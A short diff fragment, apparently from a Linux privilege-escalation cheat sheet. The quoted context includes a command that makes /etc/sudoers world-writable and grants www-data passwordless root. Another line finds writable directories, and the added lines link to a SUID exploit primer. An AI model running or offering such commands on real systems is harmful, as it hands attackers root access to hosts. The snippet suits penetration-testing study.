@@ -56,3 +56,8 @@ echo ‘chmod 777 /etc/sudoers && echo “www-data ALL=NOPASSWD: ALL” >> /etc/
 
 find / -type d \( -perm -g+w -or -perm -o+w \) -exec ls -adl {} \;
 
+**6 C program for priv esc
+
+https://fuzzmymind.com/2019/05/29/suid-binary-exploit-a-primer/
+
+
